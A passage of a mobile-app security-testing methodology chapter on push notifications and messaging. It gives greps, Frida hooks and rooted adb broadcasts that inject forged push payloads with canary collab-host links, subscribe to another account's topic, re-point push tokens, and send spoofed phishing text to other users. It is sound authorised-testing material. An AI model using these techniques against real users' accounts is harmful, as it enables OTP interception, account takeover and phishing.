# D24 · Push, Notifications & Messaging

> Push is the one channel through which a remote attacker can put bytes **inside the app's process with no tap** — and the notification drawer is the one place where those bytes are rendered under the vendor's icon, on the lock screen, to every listener the user ever granted. Messaging features add a second remote channel: anything another account can type, attach or link is parsed by the victim's client. This chapter owns the whole pipeline — who can cause a message to reach a victim, what the handler does with it, what the drawer shows, and what the chat objects behind it authorise — and rates every finding on the **action the payload drives**, never on the transport.

| | |
|---|---|
| **Phases** | P4 static deep review (handler, notification builder, SDK receivers, message renderers); P6 network/API (registration, topics, send routes, message-object authorisation, link previews); the locally-reachable halves are proved in P5 from the probe app (owner D05) |
| **Milestones** | M4, M6 |
| **VRT ceiling** | Critical — `broken_authentication_and_session_management.authentication_bypass` (P1) when a push-delivered OTP or approval lands on an attacker's device (D24-010, D24-047); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a send credential in the package (D24-017); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) for the message-object matrix (D24-036). The routine ceiling is P2: `cross_site_scripting_xss.stored.non_admin_to_anyone` for rendered messages and `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` for token re-pointing. There is no notification-specific VRT node; the two nodes that name notifications (`insufficient_security_configurability.lack_of_notification_email`, `sensitive_data_exposure.disclosure_of_secrets.data_traffic_spam`) are both P5. |
| **Primary attacker model** | AM-01 (a request or a push, no interaction) for the send and registration routes; AM-05 (a second account) for every messaging object; AM-04 (one granted special access: notification listener) for the drawer; AM-03 only where a push-SDK component is locally reachable (owner D05-025). |
| **Maps to** | MASVS-PLATFORM-1, MASVS-PLATFORM-3, MASVS-AUTH-1, MASVS-NETWORK-1, MASVS-PRIVACY-1, MASVS-CODE-4; MASTG-TEST-0315, MASTG-TEST-0318, MASTG-TEST-0319, MASTG-TEST-0381, MASTG-TEST-0394, MASTG-TEST-0398, MASTG-TEST-0400, MASTG-TEST-0200, MASTG-TEST-0216; MASTG-TECH-0043, MASTG-TECH-0162, MASTG-TECH-0164, MASTG-TECH-0173; MASTG-KNOW-0054, MASTG-KNOW-0024, MASTG-KNOW-0019, MASTG-KNOW-0026; MASTG-BEST-0063, MASTG-BEST-0071; MASTG-DEMO-0078, MASTG-DEMO-0147; MASTG-TOOL-0031, MASTG-TOOL-0097; MASWE-0004, MASWE-0018, MASWE-0024, MASWE-0026, MASWE-0029, MASWE-0032, MASWE-0033, MASWE-0035, MASWE-0037, MASWE-0050, MASWE-0069, MASWE-0073; CWE-862, CWE-639, CWE-798, CWE-79, CWE-918, CWE-319, CWE-200, CWE-294, CWE-925, CWE-926, CWE-20; ATT&CK T1517, T1582, T1636.004, T1660, T1655, T1643, T1635, T1437.001 |

## Why this domain pays

It pays because it is where **AM-01 lives on a mobile app**. Every other chapter needs an installed app
(AM-03), a tapped link (AM-02) or a network position; a push handler is reached by whoever can make the
backend, the push provider or a leaked send credential emit a message, and a chat renderer is reached by
any account that can type. The two platform facts that decide the ceiling: (1) a push provider's
`subscribeToTopic()`-style call is a **client-side** request with no server-side authorisation, so a topic
name derived from a user or order id is readable by every install of the app; (2) the legacy server-key
send endpoint was retired by the provider in 2024, so the credential class that sends to the whole install
base is now a service-account or vendor REST key (D18-032, D24-017) — a stronger secret, more often
shipped in a config file, and never needed by the client.

It pays a second time because the drawer is a **data sink with four readers**: the lock screen (Android's
`VISIBILITY_*` model), notification history (retained after dismissal since Android 11), any
`NotificationListenerService` the user ever granted, and companion devices. Android 15's OTP redaction
closes exactly one of those four, for exactly one content class, and only for listeners the platform
calls untrusted — the delivery shapes that route around it are catalogued in D22-047. Banking-trojan
tradecraft (ATT&CK T1517, T1582) is built on the readers that remain.

It pays a third time on the **messaging objects behind the UI**. Messages, attachments, reactions,
mentions, polls, call logs and link previews are each an object with its own id space and its own
authorisation check, usually written by a different team from the one that wrote the conversation check.
The report classes with the highest acceptance rates in this domain are all backend: cross-account read or
edit of a message or attachment by id, a CDN attachment URL that outlives deletion, a server-side link
previewer that fetches internal addresses, and a push-token registration that accepts another user's
identifier.

Be honest about the floor. Notification content visible to the push provider, "notifications are not
end-to-end encrypted", notification spam without an authorisation bypass, and a crash from a malformed
payload are **P5 or ineligible on every mainstream programme**. Lead with the action — the OTP that
arrived on the wrong device, the route that opened, the message that changed — never with the transport.

## The crux question

Can a party who is not the victim — a second account, an unauthenticated request, a leaked send
credential, or an app with notification access — cause content to be delivered to, rendered by, or acted
upon in the victim's client, and does the client or backend treat that content as more trusted than the
party who supplied it?

## Applicability probe

Run these four groups from `$E` with `M=$DEC/apktool/AndroidManifest.xml`, `S=$DEC/jadx/sources`, `PKG`
set to the package and `SERIAL` set to the device (`export SERIAL=emulator-5554`; never `-U`). Record
every count in `logs/D24-probe.txt` — print the number, never eyeball the list. Group 4 needs a positive
control: drive one flow that is expected to post a notification before you count.

```bash
M=$DEC/apktool/AndroidManifest.xml; S=$DEC/jadx/sources
# 1. push transport present? (FCM/c2dm, HMS, and the vendor SDKs that wrap or replace them)
grep -cE 'com\.google\.firebase\.MESSAGING_EVENT|com\.google\.android\.c2dm|com\.huawei\.hms\.push|onesignal|braze|clevertap|urbanairship|moengage|pushwoosh|airship' "$M"
# 2. notification, listener and full-screen code present?
grep -rlE 'NotificationCompat|Notification\.Builder|RemoteInput|NotificationListenerService|setFullScreenIntent|ProgressStyle|setRequestPromotedOngoing' "$S" | wc -l
# 3. SMS / RCS / messaging roles and permissions
grep -cE 'SMS_DELIVER|WAP_PUSH_DELIVER|RESPOND_VIA_MESSAGE|ROLE_SMS|android\.permission\.(READ|RECEIVE|SEND)_SMS|SmsRetriever|ImsRcs|RcsUce' "$M"
grep -rlE 'SmsManager|sendTextMessage|sendMultipartTextMessage|content://sms|Telephony\.Sms' "$S" | wc -l
# 4. live: does the installed app post anything at all? (trigger one notification first)
adb -s "$SERIAL" shell dumpsys notification --noredact | grep -c "pkg=$PKG"
# 5. messaging feature? (conversation/message objects in the endpoint map)
grep -ciE 'message|conversation|chat|thread|attachment' inventory/endpoints.csv
```

Decision rules and the exact `notes` text:

- 1 = 0 **and** 3 = 0 (both lines) **and** 4 = 0 **and** 5 = 0 → the whole domain is n/a. Write:
  `n/a — D24: no push transport (0 messaging-event filters), no SMS/RCS role, permission or API (0/0), app posts no notification after a triggered flow (dumpsys 0), no messaging objects in the endpoint map (0); probe on <date>, <apk sha256 prefix>`. Keep D24-028 open when 2 > 0 and the hit is `NotificationListenerService`.
- 1 = 0 but 4 > 0 → the notification-trust block applies (D24-022..031); mark D24-007..021 `n/a — D24: no push transport in the manifest (probe 1 = 0)` and set `engagement.json.app_facts.push=false`.
- 1 > 0 → set `engagement.json.app_facts.push=true`; D24-007..021 apply in full and the `push` tag is live.
- 3 = 0 on both lines → `n/a — D24-032..035: no SMS role, permission or SmsManager call site in $DEC`.
- 5 = 0 after the endpoint map is complete (P3 gate passed) → `n/a — D24-036..049: no message, conversation or attachment object in inventory/endpoints.csv`; otherwise the messaging block applies and needs two accounts (`blocked — D24-036..049 need account B` until `accounts` lists one).
- `adb -s "$SERIAL" shell id` must print `uid=2000(shell)` before any reachability oracle in this chapter is trusted; the root harness in D24-002/004 is a *payload* harness, not a reachability proof.

## Triage order

1. **Send credentials in the package and in older builds (D24-017; D18-031/032 for the first-party
   provider).** One grep and one benign send to your own token. This is the domain's only routine path
   to P1 without a second account.
2. **Topic and channel subscriptions derived from an id (D24-010, D24-048).** A Frida hook on the
   subscribe call plus one self-subscription to a sibling id. Cheap, and it is where OTPs and order
   events leak at scale.
3. **Registration and device endpoints (D24-007..009).** Two accounts, one proxy. Re-pointing a
   victim's token to your device is the push-side account takeover.
4. **What the handler does with the payload (D24-013..016, D24-020).** Read `onMessageReceived` and
   the SDK's notification parser to their sinks before you spend time on sending. A handler that only
   posts text caps the whole push block at Medium.
5. **Any route that lets one user send free text to another (D24-011, D24-040, D24-041).** The
   remote renderer: HTML, markdown, mentions, auto-handled links.
6. **The message-object matrix (D24-036..038, D24-044).** Mechanical, two accounts, high acceptance.
   Run it as a table, not as a tour.
7. **The drawer readers (D24-012, D24-024, D24-026, D24-028, D24-031).** Lock screen, history,
   listener, companion. Settle the OTP question with D13-048 and D22-047 open beside you.
8. **Lock-screen and full-screen surfaces (D24-022, D24-023, D24-047).** Remote text over the keyguard
   and approvals from a locked phone.
9. **SMS, RCS and native parsers (D24-032..035, D24-046).** Toll fraud from an exported surface is
   quick to settle; parser work is a D16 hand-off and is last.

## Items

### D24-001 · Build the push, notification and messaging inventory before testing anything

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — enabler for every item in this chapter |
| **Attacker** | AM-01 |
| **Applies to** | All — a chapter with no inventory row produces no defensible negative |
| **Requires** | — |
| **Maps to** | MASTG-TEST-0318 (references to SDK APIs known to handle sensitive data), MASTG-TECH-0162, MASTG-KNOW-0026, MASTG-KNOW-0054 |
| **Record** | `inventory/push.csv`; `logs/D24-001.txt` |

- **Test:** Produce one table with a row per push transport, messaging-service subclass, SDK receiver /
  service / activity, notification channel, `RemoteInput` action, full-screen or call-style use, listener
  service, and SMS/RCS role. Every downstream item indexes off this table, and D24-003 joins it to the
  endpoint map.
- **How:**
```bash
M=$DEC/apktool/AndroidManifest.xml; S=$DEC/jadx/sources; mkdir -p inventory
{
  echo 'kind,class_or_id,exported,permission,source'
  grep -B3 -A8 -E 'MESSAGING_EVENT|c2dm\.intent\.RECEIVE|hms\.push|NOTIFICATION_OPENED|NOTIFICATION_DISMISSED' "$M" \
    | grep -oE '(receiver|service|activity) android:name="[^"]+"|android:exported="[a-z]+"|android:permission="[^"]+"' \
    | paste -sd' ' - | sed 's/^/manifest,/'
  grep -rlE 'extends (FirebaseMessagingService|HmsMessageService)|onMessageReceived\(' "$S" | sed 's/^/handler,/'
  grep -rhoE 'NotificationChannel\("[^"]+"|createNotificationChannel\([^)]*\)' "$S" | sort -u | sed 's/^/channel,/'
  grep -rlE 'RemoteInput\.Builder|setFullScreenIntent|CallStyle|setRequestPromotedOngoing|ProgressStyle' "$S" | sed 's/^/surface,/'
  grep -rlE 'extends NotificationListenerService' "$S" | sed 's/^/listener,/'
  grep -oE 'SMS_DELIVER|WAP_PUSH_DELIVER|RESPOND_VIA_MESSAGE|ROLE_SMS' "$M" | sort -u | sed 's/^/sms-role,/'
} | tee inventory/push.csv | tee logs/D24-001.txt | wc -l
```
  Add one row per push-SDK vendor whose package prefix appears in `$S` (`onesignal`, `braze`, `clevertap`,
  `moengage`, `pushwoosh`, `urbanairship`, `airship`, `huawei.hms.push`) with the receiver and service
  names their manifest fragment merged in.
- **Proof:** `inventory/push.csv` exists with counts per kind printed in `logs/D24-001.txt`; a zero row
  count for a kind is a recorded fact, not an omission.
- **Escalation:** Feeds D24-003 (route → recipient), D24-019 (SDK components), D24-026 (channels) and
  D05-025 (the FCM receiver's local reachability).
- **Ruled out when:** Not applicable — the inventory is produced or the chapter is not started. A table
  with a `handler` row and no `manifest` row means the SDK's manifest fragment did not decode; re-run
  apktool on the merged base APK before continuing.

### D24-002 · Capture one real push end to end on your own token and record the payload grammar

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — positive control for the push block |
| **Attacker** | AM-01 |
| **Applies to** | Every app with a push transport (probe group 1 > 0) |
| **Requires** | push, device, frida |
| **Maps to** | MASTG-TECH-0043 (method hooking), MASTG-TOOL-0031, MASTG-KNOW-0054 |
| **Record** | `logs/D24-002.txt` (hook output with every key the handler read); `logs/D24-002-dumpsys.txt` |

- **Skip when:** `grep -c 'MESSAGING_EVENT\|c2dm\|hms.push' "$DEC/apktool/AndroidManifest.xml"` prints 0 and no vendor push SDK row is in `inventory/push.csv` — write `n/a — D24-002: no push transport (probe 1 = 0)`.
- **Test:** You cannot rate payload handling until you have seen one real payload: which keys the
  backend sends, whether it uses notification messages (the SDK posts the drawer entry itself when the app
  is backgrounded and the handler never runs) or data messages (the handler always runs), and which keys
  the handler actually reads. This is the grammar every later self-sent message must follow.
- **How:**
```bash
mkdir -p "$E/frida"; cat > "$E/frida/d24-002.js" <<'JS'
Java.perform(function () {
  var RM = Java.use('com.google.firebase.messaging.RemoteMessage');
  RM.getData.implementation = function () {
    var d = this.getData(); console.log('[D24-002] data=' + d.toString()); return d;
  };
  var B = Java.use('android.os.BaseBundle');
  B.getString.overload('java.lang.String').implementation = function (k) {
    var v = this.getString(k); if (k.indexOf('gcm.n.') === 0 || k === 'from' || k === 'google.message_id') console.log('[D24-002] bundle ' + k + '=' + v); return v;
  };
});
JS
frida -D "$SERIAL" -n "$PKG" -l "$E/frida/d24-002.js" -q -t 600 | tee "$E/logs/D24-002.txt"
# now trigger a real push to YOUR OWN account from the product (an order, a message from account B, a login alert)
adb -s "$SERIAL" shell dumpsys notification --noredact | grep -A12 "pkg=$PKG" | tee "$E/logs/D24-002-dumpsys.txt"
```
  Hook the app's own `onMessageReceived` override (class from `inventory/push.csv`) the same way and log
  every `getData().get("…")` key it reads; the `gcm.n.*` key family is what the SDK's notification parser
  reads when the backend sends a notification message.
- **Proof:** `logs/D24-002.txt` holds at least one `[D24-002] data=` line from a push the backend sent,
  and the key list the handler read; `logs/D24-002-dumpsys.txt` shows the posted entry with its channel.
- **Escalation:** The key list is the input to D24-013..016 and D24-020; the channel id feeds D24-026.
- **Ruled out when:** Not applicable — if no push can be made to arrive on your own account after
  exercising every notifying flow, record `blocked — D24-002: no push reached the device in <n> flows;
  token registered = <yes/no> (D24-007)` and keep the handler items static-only.

### D24-003 · Map who can cause a push to the victim: route → recipient selector table

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — the attacker-model decision for every push finding |
| **Attacker** | AM-01 / AM-05 |
| **Applies to** | Every app with a push transport and a backend in scope |
| **Requires** | push, backend-api |
| **Maps to** | MASTG-KNOW-0026; CWE-862 |
| **Record** | `logs/D24-003.txt` (the table); `inventory/endpoints.csv` rows tagged `push-trigger` |

- **Test:** A push finding is rated by who can send it. Build the table of every backend route that
  results in a push to *another* account (message, friend request, mention, share, invite, "remind a
  friend", admin notify, support reply, transactional event) with the recipient selector each one takes
  (user id, phone, email, topic, device id) and the auth it demands. The table decides whether D24-011..016
  are AM-05 (a second account), AM-01 (an unauthenticated route) or only AM-09 (the backend itself).
- **How:**
```bash
grep -iE 'notif|push|remind|invite|share|mention|message|alert' inventory/endpoints.csv | tee logs/D24-003.txt
# for each candidate, with the proxy on: send from account A to account B's identifier and watch B's device
# (your second handset or a second AVD signed in as B); record route, selector, auth, and whether B received it
```
  Join with D24-002: which of these routes produced the captured payload, and which keys it set.
- **Proof:** A table in `logs/D24-003.txt` with at least one row per selector type, each marked
  `delivered`/`not delivered` from an A→B trial.
- **Escalation:** A route whose selector is guessable and whose text is free is D24-011; one whose
  selector is a topic is D24-010; an unauthenticated one is AM-01 and lifts every payload item one band.
- **Ruled out when:** Every row requires an authenticated session and a recipient relationship the
  victim consented to (contact, group member, follower), and no row accepts free text — then the push
  block's remote attacker is AM-09 only and D24-013..016 are rated as D18-034 rates them.

### D24-004 · Positive-control discipline: every "handler ignores key X" negative is proved by a delivered canary

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — methodology gate |
| **Attacker** | AM-01 |
| **Applies to** | Every negative result in D24-013..023 |
| **Requires** | push, device |
| **Maps to** | `docs/04-poc-and-evidence-standard.md` (negative control in the same take); MASTG-TECH-0043 |
| **Record** | `logs/D24-004.txt` (one canary line per negative, with the message id) |

- **Test:** "The handler ignores `url`" is only true if a message carrying `url` was delivered and
  observed. Three legitimate harnesses exist, in order of evidential weight: (a) the product's own send
  path to your own account (D24-003); (b) a send credential you own for the same project — never the
  client's recovered credential against anyone but your own token (D24-017); (c) the root harness: on a
  rooted lab device, broadcast the provider's receive action to the SDK receiver with the keys from
  D24-002. (c) proves what the handler does, not that an attacker can reach it — label it `AM-12 harness`.
- **How:**
```bash
RCV=$(grep -B2 -A6 'c2dm.intent.RECEIVE' "$DEC/apktool/AndroidManifest.xml" | grep -oE 'android:name="[^"]+"' | head -1 | cut -d'"' -f2)
adb -s "$SERIAL" root && adb -s "$SERIAL" shell "am broadcast -a 'com.google.android.c2dm.intent.RECEIVE' -n '$PKG/$RCV' \
  --es 'from' '000000000000' --es 'google.message_id' 'd24-canary-$(date +%s)' \
  --es 'url' 'https://zq7x4mk9.collab.example/d24' --es 'deeplink' 'targetapp://web?url=https://zq7x4mk9.collab.example/'"
adb -s "$SERIAL" logcat -d --pid="$(adb -s "$SERIAL" shell pidof -s "$PKG")" | grep -E 'D24-002|zq7x4mk9' | tee -a "$E/logs/D24-004.txt"
```
  Then `adb -s "$SERIAL" unroot` before any reachability item. The receiver's `c2dm.permission.SEND`
  signature permission is what the root shell bypasses; an unrooted shell gets `SecurityException` — that
  is D05-025's oracle, not a harness failure.
- **Proof:** For every negative in the push block, a `logs/D24-004.txt` line showing the canary message
  id delivered (hook line or dumpsys entry) and the sink *not* reached.
- **Escalation:** n/a — this is what makes D24-013..016 defensible when they come back empty.
- **Ruled out when:** Not applicable; a negative without a delivered canary is `untested`, and the row
  stays open.

### D24-005 · Count every payload sweep — the shell-loop ban applied to push keys and message objects

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — methodology gate |
| **Attacker** | AM-01 |
| **Applies to** | Any sweep over more than five keys, ids or messages in this chapter |
| **Requires** | — |
| **Maps to** | D13-005 (the rule and the Python shape); `bb-methodology` PART 4 "Shell-Loop Ban" |
| **Record** | `logs/D24-005.txt` (per-iteration lines and the final count assertion) |

- **Test:** This is D13-005 applied here: a key sweep over `onMessageReceived`, an id sweep over
  messages or devices, or a channel-name sweep that prints no count has proved nothing.
- **How:** Python with `try/except` per iteration, one log line per iteration, and
  `assert seen == len(inputs)` at the end — exactly the D13-005 template with the request swapped for the
  route under test. Shell loops of five or fewer hardcoded items are fine.
- **Proof:** The final line of `logs/D24-005.txt` is the assertion passing with the input count.
- **Escalation:** n/a — makes D24-009, D24-036 and D24-013 defensible.
- **Ruled out when:** Not applicable; a sweep whose line count is below its input count is not evidence.

### D24-006 · Pre-severity gate for push findings: rate on the action the payload drives

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — governs the rating of D24-007..031 |
| **Attacker** | AM-01 |
| **Applies to** | Every candidate finding in the push and notification blocks before it is written up |
| **Requires** | — |
| **Maps to** | `docs/02-severity-and-reportability.md`; `docs/06-triage-playbook.md`; `sensitive_data_exposure.disclosure_of_secrets.data_traffic_spam` (P5) and `insufficient_security_configurability.lack_of_notification_email` (P5) as the nodes a lazy report lands on |
| **Record** | `logs/D24-006.txt` (one pass/kill line per candidate with the reason) |

- **Test:** Four kills and one rule. Kills: content visible to the push provider or on its dashboard is
  the provider's trust model, not a finding; "push is not end-to-end encrypted" is the same; notification
  spam without an authorisation bypass is P5; a crash from a malformed payload is P5 unless it persists or
  reaches a memory sink. Rule: the severity is the VRT node of the **action** — the route that opened
  (D09/D10 node), the object that changed (IDOR node), the OTP that moved (auth-bypass node) — and the
  push is the delivery clause in the attack-scenario sentence.
- **How:** For each candidate write one line: `D24-NNN <candidate> → action=<what changed> node=<vrt
  path> attacker=<AM-xx from D24-003> → PASS|KILL <reason>`.
- **Proof:** The line exists for every candidate before `findings/` gets a folder.
- **Escalation:** n/a — the gate is what keeps D24-011..016 out of the P5 branch.
- **Ruled out when:** Not applicable; a report filed without the line is the domain's commonest
  self-inflicted downgrade.

### D24-007 · Registration token bound to the wrong account — the client-side half of D15-055

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) |
| **Attacker** | AM-05 — a second account; AM-01 when the registration route takes no session |
| **Applies to** | Every app that uploads a push token to a backend in scope. The server-side rule (does `/devices` bind the token to the caller's session?) is D15-055; this item owns what the **client** sends with the token and the on-device proof. |
| **Requires** | push, backend-api, two-accounts, mitm |
| **Maps to** | MASWE-0018; CWE-862; D15-055 (owner of the server-side check); D13-083 (enrolment endpoint) |
| **Record** | `logs/D24-007.txt`; `requests/E-NNN.http` (the registration call as sent and as replayed); `screenshots/D24-007-1.png` (B's content on A's device) |

- **Skip when:** `grep -rlE 'onNewToken\(|getToken\(' "$DEC/jadx/sources" | wc -l` prints 0 and the proxy shows no registration call after login — write `n/a — D24-007: the client never uploads a push token (no onNewToken/getToken, no registration request)`.
- **Test:** Read the registration call the client makes on `onNewToken` and on login: which identifiers
  accompany the token (user id, phone, device id, installation id) and which of them the server believes.
  A body that names the user is an invitation to re-point; a token refresh that re-registers without the
  session is a second one. The proof is a notification for account B arriving on the device signed in as A.
- **How:**
```bash
grep -rnE 'onNewToken\(|getToken\(|registerDevice|/devices|/push/register|pushToken|fcmToken|deviceToken' "$DEC/jadx/sources" | head -40
# proxy on, log in as A, capture the registration request; replay it with A's session and B's user id / phone / device id
# then, from a second device or account B's session, trigger an event that notifies B (a message from a third account you own, a login alert)
adb -s "$SERIAL" shell dumpsys notification --noredact | grep -B2 -A10 "pkg=$PKG" | grep -E 'zq7x4mk9|<canary text>' | tee "$E/logs/D24-007.txt"
```
- **Proof:** The replayed registration returns success with B's identifier, and B's canary notification is
  posted on A's device (dumpsys line plus screenshot). The server-side half is filed under D15-055 with
  the request pair; this row holds the delivered proof.
- **Escalation:** → D24-010 / D24-047 when the delivered content is an OTP or an approval
  (`broken_authentication_and_session_management.authentication_bypass`, P1); → D13-083 for the device
  enrolment that trusts the same identifier.
- **Ruled out when:** The registration body carries only the token and the server derives the owner from
  the session: the replay with B's identifier is rejected or the identifier is ignored (show the body
  diff, not the status code — a `400 field required` proves nothing), and `onNewToken` re-registers under
  the current session (file:line of the authenticated call).

### D24-008 · Token not unregistered on logout or account switch — the next user receives the previous user's pushes

| | |
|---|---|
| **Severity ceiling** | High when the delivered content is a message body, OTP or balance; Medium otherwise |
| **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (P4); argue up on the content delivered — `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
| **Attacker** | AM-11 — the next user of the same handset (shared, demo, resold or family device); AM-05 for the account-switch variant inside one app |
| **Applies to** | Every app with a push transport and a logout or account-switch path |
| **Requires** | push, backend-api, two-accounts, device |
| **Maps to** | MASWE-0024 (sensitive data accessible after session termination); CWE-613; D20-062 and D13-087 (the deletion variant) |
| **Record** | `logs/D24-008.txt`; `requests/E-NNN.http` (the logout call: does it carry an unregister?); `screenshots/D24-008-1.png` |

- **Skip when:** `grep -c 'MESSAGING_EVENT\|c2dm\|hms.push' "$DEC/apktool/AndroidManifest.xml"` prints 0 and no vendor push SDK row is in `inventory/push.csv` — write `n/a — D24-008: no push transport (probe 1 = 0)`.
- **Test:** Log out of A, log in as B on the same device, then make A's backend emit a push. If the
  token row still belongs to A server-side, A's content lands on the handset B is using. Two mechanisms:
  the logout path never calls the unregister route, or it deletes the local token
  (`deleteToken()`) without telling the server, so the server keeps sending to a token the device still
  holds.
- **How:**
```bash
grep -rnE 'deleteToken\(|unregister|/devices/.*DELETE|logout' "$DEC/jadx/sources" | grep -iE 'push|token|device' | head -20
# proxy on: log out A and capture whether any unregister request leaves; log in B on the same device
# from a second device, trigger A's event (message to A, login alert for A); then:
adb -s "$SERIAL" shell dumpsys notification --noredact | grep -B2 -A10 "pkg=$PKG" | tee "$E/logs/D24-008.txt"
# account-switch variant: switch A→B inside the app without logout and repeat
```
- **Proof:** A's canary content posted on the device while B is signed in, with the logout request (or its
  absence) in `requests/`.
- **Escalation:** → D24-012 for what the content is; → D13-087 / D20-062 when deletion (not logout)
  leaves the registration alive.
- **Ruled out when:** The logout request carries the token (or device id) to an unregister route and the
  A→B trial delivers nothing within the provider's retry window; record both the request and the empty
  dumsys grep with the trigger time.

### D24-009 · Device and token management endpoints enumerable across users

| | |
|---|---|
| **Severity ceiling** | High for delete or re-point; Medium for listing |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for rename/delete |
| **Attacker** | AM-05 |
| **Applies to** | Apps whose backend exposes `/devices`, `/sessions`, `/push/tokens` or a "manage devices" screen |
| **Requires** | push, backend-api, two-accounts |
| **Maps to** | CWE-639; D15-039 (UUID version and the AC:H argument); D15-057 (preference and unsubscribe endpoints) |
| **Record** | `logs/D24-009.txt` (the counted sweep); `requests/E-NNN.http` |

- **Skip when:** the endpoint map has no device, session or token-management route (`grep -ciE 'device|session|push/token' inventory/endpoints.csv` = 0) — write `n/a — D24-009: no device-management route in the endpoint map`.
- **Test:** The device list is an object space like any other. Read B's device metadata (model, last
  seen, push token, IP) with A's session, rename B's device, or delete it so B stops receiving
  security alerts — a silent precondition for an account takeover that would otherwise be noticed.
- **How:** From the endpoint map, take the device routes; with A's session, request B's device id
  (obtained from B's own list) on `GET`, `PATCH`, `DELETE`; if ids are sequential, run the D24-005-style
  counted sweep over a bounded range you own; record the body diff for each verb.
- **Proof:** B's device row returned or changed with A's session (body diff), or B's device no longer
  receives a push after A's `DELETE`.
- **Escalation:** → D22-019 join: deleting the victim's device suppresses the breach-alert channel; →
  D24-007 when the row can be re-pointed.
- **Ruled out when:** Every verb with B's id under A's session returns the same response as a random id
  (scoped lookup — show the diff is empty), and ids are v4 UUIDs that leak nowhere in the app (D15-039).

### D24-010 · Topic or segment subscription derived from a guessable id — the on-device half of D15-056

| | |
|---|---|
| **Severity ceiling** | Critical when the topic carries an OTP, approval or balance; High for messages and orders |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3); `broken_authentication_and_session_management.authentication_bypass` (P1) when the delivered value authenticates |
| **Attacker** | AM-05 — any install of the app with its own account |
| **Applies to** | Apps that call a provider's topic, tag, segment or external-user-id API with a value derived from a user, order, tenant or account id. The server-side statement (no authorisation on subscribe) is D15-056; this item owns the hook and the delivered proof. |
| **Requires** | push, two-accounts, frida, device |
| **Maps to** | CWE-862; MASTG-TECH-0043; D15-056 (owner) |
| **Record** | `logs/D24-010.txt` (hook output: every topic name); `screenshots/D24-010-1.png` (B's content delivered via the topic) |

- **Skip when:** `grep -rlE 'subscribeToTopic\(|\.subscribe\("|addTag\(|setExternalUserId\(|setAlias\(' "$DEC/jadx/sources" | wc -l` prints 0 — write `n/a — D24-010: no topic, tag or alias subscription call site in $DEC`.
- **Test:** `subscribeToTopic()` and its vendor equivalents (`subscribe`, `addTag`, `setExternalUserId`,
  `setAlias`) are client requests. Hook them to learn the naming scheme, then subscribe your own install
  to a sibling name built from B's id and make B's event fire. A delivered message whose `getFrom()`
  starts with `/topics/` is the scheme's confession.
- **How:**
```bash
grep -rnE 'subscribeToTopic\(|unsubscribeFromTopic\(|\.subscribe\("|addTag\(|setExternalUserId\(|setAlias\(' "$DEC/jadx/sources" | head
cat > "$E/frida/d24-010.js" <<'JS'
Java.perform(function () {
  var FM = Java.use('com.google.firebase.messaging.FirebaseMessaging');
  FM.subscribeToTopic.implementation = function (t) { console.log('[D24-010] subscribeToTopic ' + t); return this.subscribeToTopic(t); };
  // subscribe this install to the sibling name: replace USER_B_ID with the id of the second account you own
  FM.getInstance().subscribeToTopic('user_USER_B_ID');
});
JS
frida -D "$SERIAL" -n "$PKG" -l "$E/frida/d24-010.js" -q -t 60 | tee "$E/logs/D24-010.txt"
# trigger B's event from B's device; then dumpsys / the D24-002 hook on A's device
```
- **Proof:** The hook log shows the naming scheme; B's canary content posts on A's device after the
  self-subscription, and the D24-002 hook shows `from=/topics/user_<B>`.
- **Escalation:** → `authentication_bypass` (P1) when the topic carries an OTP or an approval prompt
  (D24-047); → D24-012 for the content class; D15-056 holds the backend write-up.
- **Ruled out when:** Every topic name in the hook log is static (`news`, `promo`, a locale) and per-user
  content arrives with `from=<sender id>` (direct-to-token) — record both the topic list and one
  per-user message's `from`.

### D24-011 · A user-reachable route sends free text, a title or a deep link to other users under the app's brand

| | |
|---|---|
| **Severity ceiling** | High when the text or link is unbounded and unattributed; Medium when bounded |
| **VRT** | `broken_access_control.privilege_escalation` (varies) when a non-admin reaches an admin or system notify route; `server_side_injection.content_spoofing.text_injection` (P5) is where the same report lands without the authorisation angle; `server_security_misconfiguration.no_rate_limiting_on_form.sms_triggering` (P4) for the SMS variant |
| **Attacker** | AM-05; AM-01 when the route takes no session |
| **Applies to** | Any backend with "notify", "remind", "invite", "share", "mention" or admin-broadcast routes (D24-003 table) |
| **Requires** | push, backend-api, two-accounts |
| **Maps to** | CWE-862; CWE-20; ATT&CK T1660 (phishing), T1655 (masquerading); D13-047 (SMS flooding and cost) |
| **Record** | `logs/D24-011.txt`; `requests/E-NNN.http`; `screenshots/D24-011-1.png` (the rendered push on B's device) |

- **Skip when:** the D24-003 table has no route whose body reaches another user (every row is `not delivered` or system-templated with no free field) — write `n/a — D24-011: no user-to-user notify route (D24-003 table attached)`.
- **Test:** From the D24-003 table, take every route whose body reaches another user's drawer. Send
  attacker-chosen title, body and deep link to B and look at what B's drawer shows: is the sender named,
  is the text templated server-side, is the deep link server-chosen? Unattributed free text under the
  vendor's icon is the phishing primitive; a sender-chosen deep link is the delivery clause for
  D24-013/014.
- **How:** With the proxy on, trigger each route from A to B's identifier; then replay with the text
  fields replaced (`"Your account is locked — confirm your password"`), with a deep link to a collab host,
  and with B's identifier swapped for a third account you own. Count the routes (D24-005) and record the
  rendering on B's device.
- **Proof:** B's drawer shows your text and/or opens your link, with the request that produced it. The
  SMS variant: B's handset receives your text from the vendor's sender id.
- **Escalation:** → D24-013 / D24-014 when the link reaches the router or a WebView; → D24-022 when the
  route posts full-screen or call-style; → D13-047 when the route is unthrottled SMS.
- **Ruled out when:** Every route templates the text server-side (your body is replaced — show the diff),
